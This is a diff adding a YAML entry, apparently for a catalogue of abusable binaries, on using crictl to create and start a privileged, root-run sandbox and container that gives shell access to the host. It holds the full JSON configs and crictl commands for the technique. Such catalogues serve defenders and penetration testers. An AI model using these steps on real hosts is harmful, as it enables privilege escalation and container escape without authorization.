@@ -1,0 +1,62 @@
+---
+comment: crictl can create and start privileged containers that provide shell access on the host.
+functions:
+  shell:
+    - comment: Spawn a privileged shell inside a container by creating and starting a privileged sandbox and container.
+      code: |
+        cat >/path/to/sandbox.json <<EOF
+        {
+          "metadata": {
+            "name": "priv-test-sandbox",
+            "namespace": "default",
+            "attempt": 2,
+            "uid": "priv-test-uid-2"
+          },
+          "linux": {
+            "cgroup_parent": "system.slice",
+            "security_context": {
+              "privileged": true,
+              "namespace_options": {
+                "network": 2,
+                "pid": 0,
+                "ipc": 0
+              }
+            }
+          }
+        }
+        EOF
+
+        cat >/path/to/container.json <<EOF
+        {
+          "metadata": {
+            "name": "priv-container"
+          },
+          "image": {
+            "image": "docker.io/library/alpine:latest"
+          },
+          "command": [
+            "/bin/sh"
+          ],
+          "args": [
+            "-c",
+            "sleep 3600"
+          ],
+          "working_dir": "/",
+          "linux": {
+            "security_context": {
+              "privileged": true,
+              "run_as_user": {
+                "value": 0
+              },
+              "run_as_group": {
+                "value": 0
+              }
+            }
+          }
+        }
+        EOF
+
+        POD_ID=$(crictl runp /path/to/sandbox.json)
+        CONTAINER_ID=$(crictl create "$POD_ID" /path/to/container.json /path/to/sandbox.json)
+        crictl start "$CONTAINER_ID"
+...
